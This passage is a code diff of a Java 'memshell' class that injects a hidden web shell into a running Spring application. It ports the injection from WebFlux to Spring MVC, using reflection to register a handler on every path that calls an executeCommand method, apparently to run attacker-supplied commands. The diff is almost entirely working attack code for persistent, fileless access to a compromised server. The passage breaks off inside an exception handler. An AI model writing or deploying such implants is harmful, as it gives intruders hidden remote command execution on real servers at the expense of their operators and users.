@@ -1,26 +1,23 @@
 import org.springframework.http.HttpStatus;
 import org.springframework.http.ResponseEntity;
 import org.springframework.web.bind.annotation.RequestParam;
-import org.springframework.web.reactive.result.condition.PatternsRequestCondition;
-import org.springframework.web.reactive.result.method.RequestMappingInfo;
-import org.springframework.web.util.pattern.PathPattern;
-import org.springframework.web.util.pattern.PathPatternParser;
-
+import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
+import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
+import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
 import java.io.IOException;
 import java.lang.reflect.Method;
 import java.util.Scanner;
-
 public class SpringRequestMappingMemshell {
     public static String doInject(Object requestMappingHandlerMapping) {
         String msg = "inject-start";
         try {
-            Method registerHandlerMethod = requestMappingHandlerMapping.getClass().getDeclaredMethod("registerHandlerMethod", Object.class, Method.class, RequestMappingInfo.class);
-            registerHandlerMethod.setAccessible(true);
+            Method registerMapping = requestMappingHandlerMapping.getClass().getMethod("registerMapping", Object.class, Object.class, Method.class);
+            registerMapping.setAccessible(true);
             Method executeCommand = SpringRequestMappingMemshell.class.getDeclaredMethod("executeCommand", String.class);
-            PathPattern pathPattern = new PathPatternParser().parse("/*");
-            PatternsRequestCondition patternsRequestCondition = new PatternsRequestCondition(pathPattern);
-            RequestMappingInfo requestMappingInfo = new RequestMappingInfo("", patternsRequestCondition, null, null, null, null, null, null);
-            registerHandlerMethod.invoke(requestMappingHandlerMapping, new SpringRequestMappingMemshell(), executeCommand, requestMappingInfo);
+            PatternsRequestCondition patternsRequestCondition = new PatternsRequestCondition("/*");
+            RequestMethodsRequestCondition methodsRequestCondition = new RequestMethodsRequestCondition();
+            RequestMappingInfo requestMappingInfo = new RequestMappingInfo(patternsRequestCondition, methodsRequestCondition, null, null, null, null, null);
+            registerMapping.invoke(requestMappingHandlerMapping, requestMappingInfo, new SpringRequestMappingMemshell(), executeCommand);
             msg = "inject-success";
         }catch (Exception e){
             e.printStackTrace();
